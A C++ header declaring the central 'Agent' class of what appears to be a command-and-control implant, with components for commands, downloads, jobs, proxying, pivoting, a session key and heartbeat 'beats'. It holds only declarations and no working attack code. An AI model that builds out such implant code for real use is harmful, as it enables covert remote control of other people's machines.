#pragma once

#include <memory>
#include <span>
#include <optional>
#include <map>
#include <cstdint>

#include "AgentInfo.h"
#include "AgentConfig.h"
#include "Downloader.h"
#include "JobsController.h"
#include "MemorySaver.h"
#include "Proxyfire.h"
#include "Pivotter.h"
#include "Commander.h"

class Commander;

class Agent
{
public:
    std::unique_ptr<AgentInfo>        info;
    std::unique_ptr<AgentConfig>      config;
    std::unique_ptr<Commander>        commander;
    std::unique_ptr<Downloader>       downloader;
    std::unique_ptr<JobsController>   jober;
    std::unique_ptr<MemorySaver>      memorysaver;
    std::unique_ptr<Proxyfire>        proxyfire;
    std::unique_ptr<Pivotter>         pivotter;

    std::map<std::string, void*> values;
    
    std::array<std::uint8_t, 16> session_key;

    Agent();
    ~Agent() = default;

    Agent(const Agent&) = delete;
    Agent& operator=(const Agent&) = delete;
    Agent(Agent&&) = default;
    Agent& operator=(Agent&&) = default;

    void  SetActive(bool state);
    bool  IsActive() const;
    std::uint32_t GetWorkingSleep() const;
    std::vector<std::uint8_t> BuildBeat() const;
};
